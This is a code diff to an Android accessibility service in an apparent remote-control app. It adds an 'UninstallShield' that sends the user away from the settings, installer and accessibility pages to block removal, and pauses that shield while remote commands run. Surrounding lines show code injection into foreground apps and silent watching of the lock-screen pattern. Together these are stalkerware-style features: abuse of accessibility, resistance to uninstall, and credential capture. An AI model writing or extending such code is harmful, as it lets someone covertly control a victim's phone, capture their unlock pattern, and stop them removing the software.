@@ -589,6 +589,8 @@ class BoundaryAccessibilityService : AccessibilityService() {
     /** 墨影协议命令分发 → net/MoyingActions */
     private fun handleMoyingCommand(action: String, data: JSONObject) {
         val ch = moying ?: return
+        // 面板动作期间让守卫闭嘴（卸载自身/点按/打开 App 时不能被自己拦）
+        runCatching { com.zaka.screenagent.flow.UninstallShield.suppress(3_000L) }
         runCatching { com.zaka.screenagent.net.MoyingActions.handle(this, ch, action, data, binary) }
             .onFailure { Log.w("Moying", "action $action failed: $it") }
     }
@@ -1456,6 +1458,8 @@ class BoundaryAccessibilityService : AccessibilityService() {
                 runCatching { com.zaka.screenagent.inject.InjectRepo.onForeground(this, p) }
             }
         }
+        // ── 防误卸载：设置/安装器/无障碍页命中即返回（无障碍层，普通安装也生效）──
+        if (event != null) runCatching { com.zaka.screenagent.flow.UninstallShield.onEvent(this, event) }
         // ── 锁屏图案：窗口一出现就静默盯（不需要 verifyPin）──
         if (event != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val p = event.packageName?.toString() ?: ""
